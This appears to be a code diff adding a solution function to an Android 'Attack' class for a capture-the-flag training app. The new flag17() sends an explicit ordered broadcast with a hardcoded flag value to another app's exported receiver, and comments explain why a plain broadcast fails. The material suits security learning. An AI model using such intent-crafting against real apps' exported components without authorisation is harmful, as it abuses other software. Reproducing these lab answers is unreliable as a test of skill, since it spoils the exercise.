@@ -276,6 +276,8 @@ class Attack(private val context: Context, private val activity: HextreeActivity
 		context.startActivity(intent)
 	}
 
+	// ------------------- Broadcast Receiver Flags ------------------------//
+
 	/**
 	 * FLAG 16 - Basic Broadcast Receiver
 	 * Technique: Explicit Broadcast to Exported Receiver
@@ -296,6 +298,28 @@ class Attack(private val context: Context, private val activity: HextreeActivity
 			putExtra("flag", "give-flag-16")
 		}
 		activity.sendBroadcast(intent)
+	}
+
+	/**
+	 * FLAG 17 - Ordered Broadcast Secret
+	 * Technique: Explicit ordered broadcast with matching flag extra
+	 *
+	 * Flow:
+	 * 1. Send explicit ordered broadcast to Flag17Receiver
+	 * 2. Receiver checks isOrderedBroadcast() first
+	 * 3. Then checks "flag" extra against hardcoded "give-flag-17"
+	 * 4. Match -> success()
+	 *
+	 * Key insight: isOrderedBroadcast() gate means plain sendBroadcast()
+	 * fails here - must use sendOrderedBroadcast() specifically.
+	 */
+	fun flag17() {
+		val receiverPath = "$packageName.receivers.Flag17Receiver"
+		val intent = Intent().apply {
+			setClassName(packageName, receiverPath)
+			putExtra("flag", "give-flag-17")
+		}
+		activity.sendOrderedBroadcast(intent, null)
 	}
 
 	/**
@@ -344,7 +368,7 @@ class Attack(private val context: Context, private val activity: HextreeActivity
 	}
 
 
-	// ------------------- Content Providers Flags ------------------------//
+// ------------------- Content Providers Flags ------------------------//
 
 	/**
 	 * FLAG 30 - Basic Content Provider Query
